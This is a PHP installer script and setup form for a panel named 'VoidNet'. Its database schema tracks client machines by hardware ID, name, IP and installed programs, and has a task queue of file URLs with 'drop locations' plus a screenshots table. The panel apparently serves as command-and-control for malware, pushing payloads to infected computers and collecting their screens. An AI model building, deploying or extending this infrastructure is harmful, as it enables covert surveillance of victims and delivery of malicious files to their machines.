<?php
// VoidNet Installer (v3 - with Ping and Program features)
error_reporting(E_ALL);
ini_set('display_errors', 1);

$configFile = __DIR__ . '/config/config.php';
$configDir = __DIR__ . '/config';
$message = '';

if (file_exists($configFile)) {
    die("<strong>Error:</strong> Configuration file already exists. Please remove 'config/config.php' to reinstall.");
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // --- 1. Collect form data ---
    $db_host = $_POST['db_host'];
    $db_name = $_POST['db_name'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $admin_user = $_POST['admin_user'];
    $admin_pass = $_POST['admin_pass'];

    // --- 2. Validate input ---
    if (empty($db_host) || empty($db_name) || empty($db_user) || empty($admin_user) || empty($admin_pass)) {
        $message = '<div class="message error">Please fill in all required fields.</div>';
    } else {
        // --- 3. Test Database Connection ---
        $mysqli = @new mysqli($db_host, $db_user, $db_pass, $db_name);
        if ($mysqli->connect_error) {
            $message = '<div class="message error">Database connection failed: ' . htmlspecialchars($mysqli->connect_error) . '</div>';
        } else {
            // --- 4. Create Tables with all new columns ---
            $sql = "
            CREATE TABLE `clients` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `client_hwid` VARCHAR(255) NOT NULL UNIQUE,
              `machine_name` VARCHAR(255) DEFAULT NULL,
              `last_ip` VARCHAR(45) DEFAULT NULL,
              `last_seen` DATETIME NOT NULL,
              `programs` TEXT NULL DEFAULT NULL,
              `ping_request` DATETIME NULL DEFAULT NULL,
              `ping_response` DATETIME NULL DEFAULT NULL,
              `first_seen` DATETIME NOT NULL
            );

            CREATE TABLE `tasks` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `client_id` INT NOT NULL,
              `file_url` VARCHAR(512) NOT NULL,
              `drop_location` VARCHAR(512) NOT NULL,
              `status` ENUM('pending', 'sent', 'completed', 'failed', 'cancelled') NOT NULL DEFAULT 'pending',
              `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
              FOREIGN KEY (`client_id`) REFERENCES `clients`(`id`) ON DELETE CASCADE
            );

            CREATE TABLE `screenshots` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `client_id` INT NOT NULL,
              `file_path` VARCHAR(512) NOT NULL,
              `captured_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
              FOREIGN KEY (`client_id`) REFERENCES `clients`(`id`) ON DELETE CASCADE
            );

            CREATE TABLE `settings` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `setting_key` VARCHAR(255) NOT NULL UNIQUE,
              `setting_value` TEXT NOT NULL
            );";

            if (!$mysqli->multi_query($sql)) {
                $message = '<div class="message error">Table creation failed: ' . htmlspecialchars($mysqli->error) . '</div>';
            } else {
                // Clear multi_query results
                while ($mysqli->next_result()) {
                    if ($res = $mysqli->store_result()) {
                        $res->free();
                    }
                }

                // --- 5. Create Config File ---
                if (!is_dir($configDir)) {
                    mkdir($configDir, 0755);
                }
                
                $configContent = "<?php
// VoidNet Configuration File
define('DB_HOST', '" . addslashes($db_host) . "');
define('DB_NAME', '" . addslashes($db_name) . "');
define('DB_USER', '" . addslashes($db_user) . "');
define('DB_PASS', '" . addslashes($db_pass) . "');
?>";

                if (!file_put_contents($configFile, $configContent)) {
                    $message = '<div class="message error">Could not write to config/config.php. Please check directory permissions.</div>';
                } else {
                    // --- 6. Insert Admin Credentials ---
                    $hashed_pass = password_hash($admin_pass, PASSWORD_DEFAULT);
                    $stmt1 = $mysqli->prepare("INSERT INTO `settings` (`setting_key`, `setting_value`) VALUES ('admin_user', ?)");
                    $stmt1->bind_param('s', $admin_user);
                    $stmt1->execute();
                    
                    $stmt2 = $mysqli->prepare("INSERT INTO `settings` (`setting_key`, `setting_value`) VALUES ('admin_pass', ?)");
                    $stmt2->bind_param('s', $hashed_pass);
                    $stmt2->execute();

                    $mysqli->close();
                    
                    // --- 7. Success! ---
                    $message = '<div class="message success">
                        <strong>Installation successful!</strong><br>
                        Your configuration has been saved.<br><br>
                        <strong>IMPORTANT: For security reasons, please delete this `install.php` file now.</strong>
                    </div>';
                    // Hide the form on success
                    echo $message;
                    exit();
                }
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>VoidNet Installer</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
      color: #e0e0e0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: #242424;
      border: 1px solid #3a3a3a;
      border-radius: 12px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
      padding: 40px 30px;
      width: 100%;
      max-width: 450px;
      backdrop-filter: blur(10px);
    }
    .logo-section {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo-section img {
      width: 64px;
      height: 64px;
      margin-bottom: 15px;
      filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.1));
    }
    .logo-section h1 {
      color: #ffffff;
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 8px;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
    }
    .logo-section p {
      color: #999;
      font-size: 14px;
      font-weight: 300;
    }
    .message {
      padding: 12px 16px;
      margin-bottom: 20px;
      border-radius: 6px;
      text-align: center;
      font-size: 14px;
      font-weight: 600;
    }
    .message.error {
      background: linear-gradient(135deg, #ff4444 0%, #cc3333 100%);
      color: #fff;
      border: 1px solid #ff6666;
      box-shadow: 0 2px 8px rgba(255, 68, 68, 0.2);
    }
    .message.success {
      background: linear-gradient(135deg, #3a7b3a 0%, #2d6e2d 100%);
      color: #fff;
      border: 1px solid #5a9f5a;
      box-shadow: 0 2px 8px rgba(58, 123, 58, 0.3);
    }
    hr {
      border-color: #3a3a3a;
      margin: 30px 0;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: #ccc;
      font-size: 14px;
      font-weight: 500;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #404040;
      border-radius: 6px;
      background: #1a1a1a;
      color: #e0e0e0;
      font-size: 14px;
      transition: all 0.3s ease;
    }
    input:focus {
      outline: none;
      border-color: #666;
      background: #202020;
      box-shadow: 0 0 0 3px rgba(102, 102, 102, 0.1);
    }
    input::placeholder {
      color: #666;
    }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #404040 0%, #2d2d2d 100%);
      color: #ffffff;
      border: 1px solid #555;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    button:hover {
      background: linear-gradient(135deg, #4a4a4a 0%, #373737 100%);
      border-color: #666;
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    button:active {
      transform: translateY(0);
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-section">
      <img src="assets/image/logo.png" alt="VoidNet Logo" />
      <h1>VoidNet</h1>
      <p>Installer Panel</p>
    </div>

    <?php echo $message; ?>

    <form action="install.php" method="POST" autocomplete="off">
      <div class="form-group">
        <label for="db_host">Database Host</label>
        <input id="db_host" type="text" name="db_host" value="localhost" placeholder="Database Host" required />
      </div>
      <div class="form-group">
        <label for="db_name">Database Name</label>
        <input id="db_name" type="text" name="db_name" placeholder="Database Name" required />
      </div>
      <div class="form-group">
        <label for="db_user">Database User</label>
        <input id="db_user" type="text" name="db_user" placeholder="Database User" required />
      </div>
      <div class="form-group">
        <label for="db_pass">Database Password</label>
        <input id="db_pass" type="password" name="db_pass" placeholder="Database Password" />
      </div>
      <hr />
      <div class="form-group">
        <label for="admin_user">Admin Username</label>
        <input id="admin_user" type="text" name="admin_user" placeholder="Admin Username" required />
      </div>
      <div class="form-group">
        <label for="admin_pass">Admin Password</label>
        <input id="admin_pass" type="password" name="admin_pass" placeholder="Admin Password" required />
      </div>
      <button type="submit">Install</button>
    </form>
  </div>
</body>
</html>
